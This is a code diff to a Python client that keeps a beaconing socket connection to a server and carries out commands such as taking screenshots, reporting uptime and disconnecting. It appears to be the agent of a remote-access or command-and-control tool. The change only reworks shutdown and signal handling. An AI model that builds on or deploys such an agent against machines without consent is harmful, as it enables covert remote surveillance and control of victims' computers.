@@ -4,7 +4,7 @@ import cv2
 import random
 from platform import system, machine, version
 from hashlib import sha256
-from os import remove, path, makedirs
+from os import remove, path, makedirs, _exit
 from time import time, sleep
 from json import dumps
 from base64 import b64decode, b64encode
@@ -208,6 +208,7 @@ def get_uptime():
     send_command({'response': {'data': uptime}})
 
 def parse_action(action):
+    global client, exit_process, beacon_interval_instance
     try:
         parts = action.strip().split(' ', 1)
         command = parts[0]
@@ -220,9 +221,12 @@ def parse_action(action):
             get_uptime()
             return
         elif command == 'di':
-            global exit_process
             exit_process = True
-            exit(0)
+            if client:
+                client.close()
+            if beacon_interval_instance:
+                beacon_interval_instance.cancel()
+            _exit(0)
         elif command == 'ss':
             run_screenshot()
             return
@@ -237,7 +241,7 @@ def parse_action(action):
 
 # Connect to server function
 def connect_to_server():
-    global client, beacon_thread, beacon_stop_event
+    global client, beacon_thread, beacon_stop_event, exit_process, beacon_interval_instance
 
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -288,7 +292,7 @@ def connect_to_server():
             else:
                 log_it('Max retries reached. Exiting.')
                 sleep(BEACON_MAX_INTERVAL * 8)
-    
+
     except Exception as err:
         log_it(f"Exception: {err}")
         beacon_stop_event.set()
@@ -298,19 +302,18 @@ def connect_to_server():
             client.close()
         log_it(f"Error: Client connection failed. {err}")
 
-def handle_sigint(signum, frame):
-    global exit_process, beacon_interval_instance, client
-    log_it("SIGINT received. Shutting down gracefully...")
-    exit_process = True
+def signal_handler(sig, frame):
+    global client, beacon_interval_instance
     if client:
         client.close()
     if beacon_interval_instance:
         beacon_interval_instance.cancel()
-    exit(0)
+    _exit(0)
 
 def main():
-    signal.signal(signal.SIGINT, handle_sigint)
+    signal.signal(signal.SIGINT, signal_handler)
     connect_to_server()
+    
 
 if __name__ == "__main__":
     main()
